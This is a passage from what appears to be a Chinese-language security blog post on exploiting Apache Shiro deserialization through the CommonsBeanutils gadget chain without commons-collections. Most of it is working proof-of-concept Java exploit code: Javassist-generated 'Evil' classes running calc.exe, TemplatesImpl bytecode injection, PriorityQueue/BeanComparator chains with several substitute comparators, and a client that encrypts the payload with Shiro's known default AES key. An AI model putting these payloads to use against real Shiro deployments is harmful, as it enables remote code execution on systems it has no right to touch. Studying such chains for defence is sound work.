        cmd = String.format(cmd, <span class="hljs-string">&quot;calc.exe&quot;</span>);
        <span class="hljs-comment">// &#x7ED9;&#x8FD9;&#x4E2A;&#x7C7B;&#x521B;&#x5EFA; static &#x4EE3;&#x7801;&#x5757;&#xFF0C;&#x5E76;&#x63D2;&#x5165;&#x5230;&#x7C7B;&#x4E2D;</span>
        ctClass.makeClassInitializer().insertBefore(cmd);
        String className = <span class="hljs-string">&quot;Evil&quot;</span> + System.nanoTime();
        <span class="hljs-comment">// &#x91CD;&#x65B0;&#x8BBE;&#x7F6E;&#x7C7B;&#x540D;&#x4E3A;&#x4E00;&#x4E2A;&#x968F;&#x673A;&#x7684;&#x540D;&#x5B57;</span>
        ctClass.setName(className);
        <span class="hljs-comment">// &#x7ED9;&#x8FD9;&#x4E2A;&#x7C7B;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x7236;&#x7C7B;&#xFF0C;&#x5373;&#x7EE7;&#x627F;&#x8BE5;&#x7236;&#x7C7B;&#x3002;</span>
        ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName())); <span class="hljs-comment">// &#x8BBE;&#x7F6E;&#x7236;&#x7C7B;&#x4E3A;AbstractTranslet&#xFF0C;&#x907F;&#x514D;&#x62A5;&#x9519;</span>
        <span class="hljs-comment">// &#x5C06;&#x8FD9;&#x4E2A;&#x7C7B;&#x8F93;&#x51FA;&#x5230;&#x9879;&#x76EE;&#x76EE;&#x5F55;&#x4E0B;</span>
<span class="hljs-comment">//        ctClass.writeFile(&quot;./&quot;);</span>
        <span class="hljs-comment">// &#x5C06;&#x8FD9;&#x4E2A;class&#x8F6C;&#x6362;&#x4E3A;&#x5B57;&#x8282;&#x6570;&#x7EC4;</span>
        <span class="hljs-keyword">byte</span>[] classBytes = ctClass.toBytecode();
        <span class="hljs-comment">// &#x5C06;&#x5B57;&#x8282;&#x6570;&#x7EC4;&#x653E;&#x7F6E;&#x5230;&#x4E00;&#x4E2A;&#x4E8C;&#x7EF4;&#x6570;&#x7EC4;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x5143;&#x7D20;</span>
        <span class="hljs-keyword">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]{classBytes};
        <span class="hljs-comment">// &#x5B9E;&#x4F8B;&#x5316;TemplatesImpl&#x5BF9;&#x8C61;</span>
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        <span class="hljs-comment">// &#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x8BBE;&#x7F6E;&#x5B57;&#x6BB5;&#x7684;&#x503C;&#x4E3A;&#x4E8C;&#x7EF4;&#x5B57;&#x8282;&#x6570;&#x7EC4;</span>
        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetByteCodes);
        <span class="hljs-comment">// &#x8FDB;&#x5165; defineTransletClasses() &#x65B9;&#x6CD5;&#x9700;&#x8981;&#x7684;&#x6761;&#x4EF6;</span>
        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;name&quot;</span>);
        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-keyword">null</span>);
        <span class="hljs-comment">// &#x5B9E;&#x4F8B;&#x5316;PriorityQueue&#x5BF9;&#x8C61;</span>
        PriorityQueue priorityQueue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">2</span>, beanComparator);
        <span class="hljs-comment">// &#x901A;&#x8FC7;add&#x5EFA;&#x7ACB;size&#x4E3A;2&#x7684;&#x6570;&#x7EC4;</span>
        priorityQueue.add(templates);priorityQueue.add(templates);

        <span class="hljs-keyword">try</span>{
            ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;payload.bin&quot;</span>));
            outputStream.writeObject(priorityQueue);
            outputStream.close();

            ObjectInputStream inputStream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;payload.bin&quot;</span>));
            inputStream.readObject();
        }<span class="hljs-keyword">catch</span>(Exception e){
            e.printStackTrace();
        }
    }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception </span>{
        <span class="hljs-keyword">final</span> Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> </span>{
        Field field = <span class="hljs-keyword">null</span>;
        <span class="hljs-keyword">try</span> {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(<span class="hljs-keyword">true</span>);
        }
        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) {
            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-keyword">null</span>)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        <span class="hljs-keyword">return</span> field;
    }
}
</code></pre>
<h3 id="&#x65E0;&#x4F9D;&#x8D56;shiro&#x53CD;&#x5E8F;&#x5217;&#x5316;">&#x65E0;&#x4F9D;&#x8D56;Shiro&#x53CD;&#x5E8F;&#x5217;&#x5316;</h3>
<p>&#x5F53;Shiro&#x8131;&#x79BB;CommonsCollections&#x65F6;, &#x5176;&#x672C;&#x8EAB;&#x8FD8;&#x662F;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x53CD;&#x5E8F;&#x5217;&#x5316;, &#x800C;&#x4E14;&#x4F9D;&#x8D56;&#x4E2D;&#x4ECD;&#x5B58;&#x5728; commons-banutils&#x3002;</p>
<p>&#x5728;&#x6CA1;&#x6709;commons-collections&#x4E0B;&#x4F7F;&#x7528;BeanComparator&#x53BB;&#x5EFA;&#x7ACB;Shiro&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x4F1A;&#x53D1;&#x73B0;&#x5982;&#x4E0B;&#x7684;&#x95EE;&#x9898;</p>
<p><img src="img/1642408007365.png" alt="1642408007365"></p>
<p>commons-beanutils&#x672C;&#x6765;&#x4F9D;&#x8D56;&#x4E8E;commons-collections&#xFF0C;&#x4F46;&#x662F;&#x5728;Shiro&#x4E2D;&#xFF0C;&#x5B83;&#x7684;commons-beanutils&#x867D;&#x7136;&#x5305;&#x542B;&#x4E86;&#x4E00;&#x90E8;&#x5206;commons-collections&#x7684;&#x7C7B;&#xFF0C;&#x4F46;&#x5374;&#x4E0D;&#x5168;&#x3002;&#x8FD9;&#x4E5F;&#x5BFC;&#x81F4;&#xFF0C;&#x6B63;&#x5E38;&#x4F7F;&#x7528;Shiro&#x7684;&#x65F6;&#x5019;&#x4E0D;&#x9700;&#x8981;&#x4F9D;&#x8D56;&#x4E8E; commons-collections&#xFF0C;&#x4F46;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5229;&#x7528;&#x7684;&#x65F6;&#x5019;&#x9700;&#x8981;&#x4F9D;&#x8D56;&#x4E8E;commons-collections&#x3002;</p>
<p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8DDF;&#x8FDB;BeanComparator&#x7C7B;&#x4F1A;&#x53D1;&#x73B0;&#x4E0D;&#x5305;&#x542B;ComparableComparator&#x7C7B;</p>
<p><img src="img/1642408277009.png" alt="1642408277009"></p>
<p>&#x5728; BeanComparator &#x7C7B;&#x7684;&#x6784;&#x9020;&#x51FD;&#x6570;&#x5904;&#xFF0C;&#x5F53;&#x6CA1;&#x6709;&#x663E;&#x5F0F;&#x4F20;&#x5165; Comparator &#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5219;&#x9ED8;&#x8BA4;&#x4F7F;&#x7528; ComparableComparator&#x3002;</p>
<pre><code class="lang-java">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">BeanComparator</span><span class="hljs-params">( String property )</span> </span>{
        <span class="hljs-keyword">this</span>( property, ComparableComparator.getInstance() );
    }
</code></pre>
<p>&#x65E2;&#x7136;&#x6B64;&#x65F6;&#x6CA1;&#x6709;  ComparableComparator &#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x627E;&#x5230;&#x4E00;&#x4E2A;&#x7C7B;&#x6765;&#x66FF;&#x6362;&#xFF0C;&#x5B83;&#x6EE1;&#x8DB3;&#x4E0B;&#x9762;&#x8FD9;&#x51E0;&#x4E2A;&#x6761;&#x4EF6;</p>
<ol>
<li><p>&#x5B9E;&#x73B0; java.util.Comparator &#x63A5;&#x53E3; </p>
</li>
<li><p>&#x5B9E;&#x73B0; java.io.Serializable &#x63A5;&#x53E3; </p>
</li>
<li><p>Java&#x3001;shiro&#x6216;commons-beanutils&#x81EA;&#x5E26;&#xFF0C;&#x4E14;&#x517C;&#x5BB9;&#x6027;&#x5F3A;</p>
</li>
</ol>
<p>&#x53EF;&#x4EE5;&#x627E;&#x6253;&#x7EE7;&#x627F;Comparator&#x65B9;&#x6CD5;&#x7684;&#x7C7B;</p>
<pre><code>CaseInsensitiveComparator
ReverseComparator
AttarComparator
</code></pre><h4 id="caseinsensitivecomparator">CaseInsensitiveComparator</h4>
<p>&#x901A;&#x8FC7; String.CASE_INSENSITIVE_ORDER &#x5373;&#x53EF;&#x62FF;&#x5230;&#x4E0A;&#x4E0B;&#x6587;&#x4E2D;&#x7684; CaseInsensitiveComparator &#x5BF9;&#x8C61;&#xFF0C;&#x7528;&#x5B83;&#x6765;&#x5B9E;&#x4F8B;&#x5316; BeanComparator</p>
<pre><code class="lang-java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Comparator&lt;String&gt; CASE_INSENSITIVE_ORDER
                                         = <span class="hljs-keyword">new</span> CaseInsensitiveComparator();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CaseInsensitiveComparator</span>
            <span class="hljs-keyword">implements</span> <span class="hljs-title">Comparator</span>&lt;<span class="hljs-title">String</span>&gt;, <span class="hljs-title">java</span>.<span class="hljs-title">io</span>.<span class="hljs-title">Serializable</span> </span>{
        <span class="hljs-comment">// use serialVersionUID from JDK 1.2.2 for interoperability</span>
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> serialVersionUID = <span class="hljs-number">8575799808933029326L</span>;

        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">compare</span><span class="hljs-params">(String s1, String s2)</span> </span>{
            <span class="hljs-keyword">int</span> n1 = s1.length();
            <span class="hljs-keyword">int</span> n2 = s2.length();
            <span class="hljs-keyword">int</span> min = Math.min(n1, n2);
            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; min; i++) {
                <span class="hljs-keyword">char</span> c1 = s1.charAt(i);
                <span class="hljs-keyword">char</span> c2 = s2.charAt(i);
                <span class="hljs-keyword">if</span> (c1 != c2) {
                    c1 = Character.toUpperCase(c1);
                    c2 = Character.toUpperCase(c2);
                    <span class="hljs-keyword">if</span> (c1 != c2) {
                        c1 = Character.toLowerCase(c1);
                        c2 = Character.toLowerCase(c2);
                        <span class="hljs-keyword">if</span> (c1 != c2) {
                            <span class="hljs-comment">// No overflow because of numeric promotion</span>
                            <span class="hljs-keyword">return</span> c1 - c2;
                        }
                    }
                }
            }
            <span class="hljs-keyword">return</span> n1 - n2;
        }

        <span class="hljs-comment">/** Replaces the de-serialized object. */</span>
        <span class="hljs-function"><span class="hljs-keyword">private</span> Object <span class="hljs-title">readResolve</span><span class="hljs-params">()</span> </span>{ <span class="hljs-keyword">return</span> CASE_INSENSITIVE_ORDER; }
    }
</code></pre>
<p>POC</p>
<pre><code class="lang-java"><span class="hljs-keyword">package</span> CommonsBeanutils;

<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
<span class="hljs-keyword">import</span> javassist.ClassClassPath;
<span class="hljs-keyword">import</span> javassist.ClassPool;
<span class="hljs-keyword">import</span> javassist.CtClass;
<span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;

<span class="hljs-keyword">import</span> java.io.*;
<span class="hljs-keyword">import</span> java.lang.reflect.Field;
<span class="hljs-keyword">import</span> java.util.PriorityQueue;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommonsBeanutils1</span> </span>{
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">byte</span>[] getPayload(<span class="hljs-keyword">byte</span>[] clazzBytes) <span class="hljs-keyword">throws</span> Exception {
        TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();
        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]{clazzBytes});
        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;EvilTemplatesImpl&quot;</span>);
        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-keyword">null</span>);
        <span class="hljs-comment">// &#x5B9E;&#x4F8B;&#x5316;&#x4E00;&#x4E2A;BeanComparator&#x5BF9;&#x8C61;</span>
        <span class="hljs-keyword">final</span> BeanComparator beanComparator = <span class="hljs-keyword">new</span> BeanComparator(<span class="hljs-keyword">null</span>, String.CASE_INSENSITIVE_ORDER);
        <span class="hljs-comment">// &#x5B9E;&#x4F8B;&#x5316;PriorityQueue&#x5BF9;&#x8C61;</span>
        PriorityQueue priorityQueue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">2</span>, beanComparator);
        <span class="hljs-comment">// stub data for replacement later</span>
        priorityQueue.add(<span class="hljs-string">&quot;1&quot;</span>);priorityQueue.add(<span class="hljs-string">&quot;2&quot;</span>);
        <span class="hljs-comment">/**&#x6362;&#x7528;&#x7EE7;&#x627F;&#x4F1A;&#x89E6;&#x53D1;&#x4E00;&#x4E9B;&#x987A;&#x5E8F;&#x4E0A;&#x7684;&#x95EE;&#x9898;*/</span>
        setFieldValue(beanComparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>);
        setFieldValue(priorityQueue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> Object[]{templates, templates});

        <span class="hljs-comment">// ==================</span>
        <span class="hljs-comment">// &#x751F;&#x6210;&#x5E8F;&#x5217;&#x5316;&#x5B57;&#x7B26;&#x4E32;</span>
        ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> ByteArrayOutputStream();
        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(barr);
        oos.writeObject(priorityQueue);
        oos.close();

        <span class="hljs-keyword">return</span> barr.toByteArray();
    }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception </span>{
        <span class="hljs-keyword">final</span> Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> </span>{
        Field field = <span class="hljs-keyword">null</span>;
        <span class="hljs-keyword">try</span> {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(<span class="hljs-keyword">true</span>);
        }
        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) {
            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-keyword">null</span>)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        <span class="hljs-keyword">return</span> field;
    }
}
</code></pre>
<p>&#x52A0;&#x5BC6;&#x8C03;&#x7528;</p>
<pre><code class="lang-java"><span class="hljs-keyword">package</span> CommonsBeanutils;
<span class="hljs-keyword">import</span> javassist.ClassPool;
<span class="hljs-keyword">import</span> javassist.CtClass;
<span class="hljs-keyword">import</span> org.apache.shiro.crypto.AesCipherService;
<span class="hljs-keyword">import</span> org.apache.shiro.util.ByteSource;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Client1</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String []args)</span> <span class="hljs-keyword">throws</span> Exception </span>{
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(Evil.class.getName());
<span class="hljs-comment">//        byte[] payloads = new CommonsBeanutils1().getPayload(clazz.toBytecode());</span>
        <span class="hljs-keyword">byte</span>[] payloads = <span class="hljs-keyword">new</span> CommonsBeanutils1Shiro().getPayload(clazz.toBytecode());

        AesCipherService aes = <span class="hljs-keyword">new</span> AesCipherService();
        <span class="hljs-keyword">byte</span>[] key = java.util.Base64.getDecoder().decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);

        ByteSource ciphertext = aes.encrypt(payloads, key);
        System.out.println(ciphertext.toString());
    }
}
</code></pre>
<p>&#x89E6;&#x53D1;&#x6548;&#x679C;</p>
<p><img src="img/CaseInsensitiveComparator.gif" alt="CaseInsensitiveComparator"></p>
<h4 id="reversecomparator">ReverseComparator</h4>
<p>&#x901A;&#x8FC7; <code>Collections#reverseOrder()</code> &#x5373;&#x53EF;&#x62FF;&#x5230;&#x4E0A;&#x4E0B;&#x6587;&#x4E2D;&#x7684; ReverseComparator &#x5BF9;&#x8C61;&#xFF0C;&#x7528;&#x5B83;&#x6765;&#x5B9E;&#x4F8B;&#x5316; BeanComparator</p>
<pre><code class="lang-java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; <span class="hljs-function">Comparator&lt;T&gt; <span class="hljs-title">reverseOrder</span><span class="hljs-params">()</span> </span>{
        <span class="hljs-keyword">return</span> (Comparator&lt;T&gt;) ReverseComparator.REVERSE_ORDER;
    }

    <span class="hljs-comment">/**
     * <span class="hljs-doctag">@serial</span> include
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ReverseComparator</span>
        <span class="hljs-keyword">implements</span> <span class="hljs-title">Comparator</span>&lt;<span class="hljs-title">Comparable</span>&lt;<span class="hljs-title">Object</span>&gt;&gt;, <span class="hljs-title">Serializable</span> </span>{

        <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> serialVersionUID = <span class="hljs-number">7207038068494060240L</span>;

        <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> ReverseComparator REVERSE_ORDER
            = <span class="hljs-keyword">new</span> ReverseComparator();

        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">compare</span><span class="hljs-params">(Comparable&lt;Object&gt; c1, Comparable&lt;Object&gt; c2)</span> </span>{
            <span class="hljs-keyword">return</span> c2.compareTo(c1);
        }

        <span class="hljs-function"><span class="hljs-keyword">private</span> Object <span class="hljs-title">readResolve</span><span class="hljs-params">()</span> </span>{ <span class="hljs-keyword">return</span> Collections.reverseOrder(); }

        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> Comparator&lt;Comparable&lt;Object&gt;&gt; reversed() {
            <span class="hljs-keyword">return</span> Comparator.naturalOrder();
        }
    }
</code></pre>
<p>&#x4FEE;&#x6539;&#x5904;</p>
<pre><code class="lang-java"><span class="hljs-comment">/**&#x4F7F;&#x7528;ReverseComparator&#x7C7B;*/</span>
<span class="hljs-keyword">final</span> BeanComparator beanComparator = <span class="hljs-keyword">new</span> BeanComparator(<span class="hljs-keyword">null</span>, Collections.reverseOrder());
<span class="hljs-keyword">final</span> BeanComparator beanComparator = <span class="hljs-keyword">new</span> BeanComparator(<span class="hljs-keyword">null</span>, Comparator.reverseOrder().reversed());
<span class="hljs-keyword">final</span> BeanComparator beanComparator = <span class="hljs-keyword">new</span> BeanComparator(<span class="hljs-keyword">null</span>, Comparator.naturalOrder().reversed());
</code></pre>
<h4 id="attrcompare">AttrCompare</h4>
<p><code>PriorityQueue#add()</code>&#x5904;&#x9700;&#x8981;&#x6DFB;&#x52A0;&#x5E26;&#x53C2;&#x6570;&#x4E14;&#x7EE7;&#x627F;Attr&#x63A5;&#x53E3;&#x7684;&#x7C7B;</p>
<pre><code>AttrNSImpl
PSVIAttrNSImpl
</code></pre><p>&#x6709;&#x53C2;&#x6784;&#x9020;&#x53EF;&#x53C2;&#x8003;&#x9700;&#x8981;&#x7684;&#x53C2;&#x6570;, &#x8FD9;&#x4E24;&#x4E2A;&#x7C7B;&#x9700;&#x8981;&#x7684;&#x53C2;&#x6570;&#x662F;&#x76F8;&#x540C;&#x7684;</p>
<pre><code>AttrNSImpl(CoreDocumentImpl ownerDocument,
                         String namespaceURI,
                         String qualifiedName,
                         String localName)
</code></pre><p>POC</p>
<pre><code class="lang-java"><span class="hljs-keyword">package</span> CommonsBeanutils;

<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
<span class="hljs-keyword">import</span> com.sun.org.apache.xerces.internal.dom.*;
<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;
<span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;

<span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;
<span class="hljs-keyword">import</span> java.io.ObjectOutputStream;
<span class="hljs-keyword">import</span> java.lang.reflect.Field;
<span class="hljs-keyword">import</span> java.util.PriorityQueue;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommonsBeanutils2_AttrComparator</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception </span>{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(<span class="hljs-keyword">true</span>);
        field.set(obj, value);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">byte</span>[] getPayload(<span class="hljs-keyword">byte</span>[] clazzBytes) <span class="hljs-keyword">throws</span> Exception {
        TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();
        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]{clazzBytes});
        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;EvilTemplatesImpl&quot;</span>);
        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-keyword">null</span>);

        <span class="hljs-comment">// &#x9700;&#x8981;&#x5E26;&#x53C2;&#x6570;&#x4E14;&#x7EE7;&#x627F;Attr&#x63A5;&#x53E3; AttrNSImpl &#x6709;&#x53C2;&#x6784;&#x9020;</span>
        AttrNSImpl attrNS1 = <span class="hljs-keyword">new</span> AttrNSImpl(<span class="hljs-keyword">new</span> CoreDocumentImpl(), <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);
        <span class="hljs-comment">// PSVIAttrNSImpl &#x6709;&#x53C2;&#x6784;&#x9020;</span>
        PSVIAttrNSImpl psviAttrNS = <span class="hljs-keyword">new</span> PSVIAttrNSImpl(<span class="hljs-keyword">new</span> CoreDocumentImpl(), <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);

        <span class="hljs-comment">/**&#x4F7F;&#x7528;AttrComparator&#x7C7B;*/</span>
        <span class="hljs-keyword">final</span> BeanComparator beanComparator = <span class="hljs-keyword">new</span> BeanComparator(<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> AttrCompare());
        <span class="hljs-keyword">final</span> PriorityQueue&lt;Object&gt; priorityQueue = <span class="hljs-keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="hljs-number">2</span>, beanComparator);
        <span class="hljs-comment">// stub data for replacement later</span>
        priorityQueue.add(psviAttrNS);priorityQueue.add(psviAttrNS);
        <span class="hljs-comment">/**&#x6362;&#x7528;&#x7EE7;&#x627F;&#x4F1A;&#x89E6;&#x53D1;&#x4E00;&#x4E9B;&#x987A;&#x5E8F;&#x4E0A;&#x7684;&#x95EE;&#x9898;*/</span>
        setFieldValue(beanComparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>);
        setFieldValue(priorityQueue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> Object[]{templates, templates});

        <span class="hljs-comment">// ==================</span>
        <span class="hljs-comment">// &#x751F;&#x6210;&#x5E8F;&#x5217;&#x5316;&#x5B57;&#x7B26;&#x4E32;</span>
        ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> ByteArrayOutputStream();
        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(barr);
        oos.writeObject(priorityQueue);
        oos.close();

        <span class="hljs-keyword">return</span> barr.toByteArray();
    }
}
</code></pre>
<p>&#x8FD8;&#x6709;&#x4E00;&#x4E9B;&#x53EF;&#x7528;&#x7684;Comparabtor&#x662F;&#x5EFA;&#x7ACB;&#x5728;&#x4F9D;&#x8D56;&#x7684;&#x57FA;&#x7840;&#x4E0A;</p>
<p>org.apache.commons.lang3.compare.ObjectToStringComparator</p>
<pre><code class="lang-java">&lt;dependency&gt;
   &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
   &lt;artifactId&gt;commons-lang3&lt;/artifactId&gt;
   &lt;version&gt;3.12.0&lt;/version&gt;
&lt;/dependency&gt;
&#x2193;&#x2193;&#x2193;
// ObjectToStringComparator stringComparator = new ObjectToStringComparator();
        final BeanComparator beanComparator = new BeanComparator(null, new ObjectToStringComparator());
        final PriorityQueue&lt;Object&gt; priorityQueue = new PriorityQueue&lt;Object&gt;(2, beanComparator);
        // stub data for replacement later
        priorityQueue.add(&quot;1&quot;);priorityQueue.add(&quot;2&quot;);
        /**&#x6362;&#x7528;&#x7EE7;&#x627F;&#x4F1A;&#x89E6;&#x53D1;&#x4E00;&#x4E9B;&#x987A;&#x5E8F;&#x4E0A;&#x7684;&#x95EE;&#x9898;*/
        setFieldValue(beanComparator, &quot;property&quot;, &quot;outputProperties&quot;);
        setFieldValue(priorityQueue, &quot;queue&quot;, new Object[]{templates, templates});
</code></pre>
<p>org.apache.logging.log4j.util.PropertySource</p>
<pre><code class="lang-java">&lt;dependency&gt;
  &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
  &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;
  &lt;version&gt;2.13.3&lt;/version&gt;
&lt;/dependency&gt;
&#x2193;&#x2193;&#x2193;
/**&#x4F7F;&#x7528;PropertySource.Comparator&#x7C7B;*/
        final PropertySource propertySource = new PropertySource() {
            public int getPriority() {
                return 0;
            }
        };

        final BeanComparator beanComparator = new BeanComparator(null, new PropertySource.Comparator());
        final PriorityQueue&lt;Object&gt; priorityQueue = new PriorityQueue&lt;Object&gt;(2, beanComparator);
        // stub data for replacement later
        priorityQueue.add(propertySource);priorityQueue.add(propertySource);
        /**&#x6362;&#x7528;&#x7EE7;&#x627F;&#x4F1A;&#x89E6;&#x53D1;&#x4E00;&#x4E9B;&#x987A;&#x5E8F;&#x4E0A;&#x7684;&#x95EE;&#x9898;*/
        setFieldValue(beanComparator, &quot;property&quot;, &quot;outputProperties&quot;);
        setFieldValue(priorityQueue, &quot;queue&quot;, new Object[]{templates, templates});
</code></pre>
<h4 id="objecttostringcomparator">ObjectToStringComparator</h4>
<p>&#x4F9D;&#x8D56;</p>
<pre><code>&lt;dependency&gt;
    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
    &lt;artifactId&gt;commons-lang3&lt;/artifactId&gt;
    &lt;version&gt;3.12.0&lt;/version&gt;
&lt;/dependency&gt;
</code></pre><p>POC</p>
<pre><code class="lang-java"><span class="hljs-keyword">package</span> CommonsBeanutils;

<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
<span class="hljs-keyword">import</span> com.sun.org.apache.xerces.internal.dom.AttrNSImpl;
<span class="hljs-keyword">import</span> com.sun.org.apache.xerces.internal.dom.CoreDocumentImpl;
<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;
